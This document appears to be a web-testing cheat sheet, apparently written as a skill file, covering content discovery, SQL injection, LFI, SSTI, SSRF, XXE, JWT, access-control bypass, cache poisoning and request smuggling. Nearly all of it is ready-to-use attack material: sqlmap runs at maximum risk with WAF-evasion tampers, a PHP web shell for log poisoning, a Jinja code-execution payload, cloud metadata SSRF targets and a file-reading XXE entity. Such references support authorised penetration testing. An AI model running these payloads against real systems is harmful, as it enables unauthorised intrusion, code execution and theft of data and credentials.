---
name: web
description: Web app testing — content discovery, params, LFI/SQLi/SSRF/SSTI, JWT, deserialization, cache tricks.
tags: [http, fuzzing, sqli, ssrf]
---
# Web

## Content discovery
- `ffuf -u https://$T/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404 -t 100`
- Extensions: `-e .php,.bak,.old,.zip,.txt,.json`
- Recursion: `-recursion -recursion-depth 2` (watch duplicates).
- Vhost: `ffuf -u https://$T -H "Host: FUZZ.$D" -w subs.txt -fs <baseline>`
- Backups: `index.php~`, `.index.php.swp`, `index.php.bak`, `.git/HEAD`, `.svn/entries`, `.DS_Store`, `web.config`, `composer.lock`.
- Param mining: `arjun -u https://$T/api -m GET,POST`; `x8 -u https://$T`.
- Always calibrate with a random path first; filter on size, words, or lines.

## Quick wins
- `curl -sI https://$T` → server, framework, `X-Powered-By`.
- `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/server-status`, `/actuator/env`, `/debug/pprof/`.
- Error pages leak paths: force 500 with `%00`, long params, bad JSON.
- Source maps: `app.js.map` → original TS with comments and API routes.

## Injection
- SQLi: `sqlmap -u "https://$T/?id=1" --batch --level 5 --risk 3 --dbs`; manual `' AND SLEEP(5)-- -`, `' UNION SELECT NULL-- -`.
  WAF: `--tamper=space2comment,between,randomcase`; `--technique=BEUSTQ`.
- LFI: `?file=php://filter/convert.base64-encode/resource=index.php`, `/proc/self/environ`, log poisoning via `User-Agent: <?php system($_GET[c]); ?>` then include access.log.
- SSTI: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`; Jinja RCE `{{ cycler.__init__.__globals__.os.popen('id').read() }}`.
- SSRF: `http://127.0.0.1:80`, `http://[::1]`, `http://169.254.169.254/latest/meta-data/`, `http://0x7f000001`, DNS rebinding; gopher for Redis (`gopher://127.0.0.1:6379/_...`).
- XXE: `<!ENTITY x SYSTEM "file:///etc/passwd">`; blind via external DTD.
- Deserialization: Java `ysoserial`, PHP `phpggc`, .NET `ysoserial.net`, Python pickle.
- JWT: `jwt_tool $TOKEN -M at`; alg=none, weak HS256 secret (`hashcat -m 16500`), kid path traversal, jku/x5u SSRF.

## Access control
- IDOR: swap numeric/uuid ids, `?user=`, headers `X-User-Id`, `X-Forwarded-For: 127.0.0.1`.
- Forced browsing: `/admin`, `/internal`, `/api/v1/users/1`.
- Method swap: `GET→POST`, `PUT`, `PATCH`, `DELETE`, `OPTIONS` (Allow header).
- Path tricks: `/admin/..;/`, `%2e%2e/`, double encoding, trailing dot/slash.

## Cache & proxy
- `X-Forwarded-Host` cache poisoning, `X-Original-URL: /admin`, `X-Rewrite-URL`.
- Web cache deception: `/account/profile.css` cached publicly.
- Smuggling: `CL.TE`/`TE.CL` with `Transfer-Encoding: chunked`; use `smuggler` or Burp.

## Hidden knowledge
- 403 is not dead: try `X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, `Referer: https://$T/`.
- `OPTIONS *` sometimes lists verbs.
- Compare authenticated vs anonymous byte-for-byte: `diff <(curl -s ...) <(curl -s -H "Cookie: ..." ...)`.
- Time-based blind beats boolean when the WAF blocks output: `SLEEP(5)` vs `BENCHMARK`.
- Check both HTTP and HTTPS, and the IP directly with a Host header — vhost routing differs.
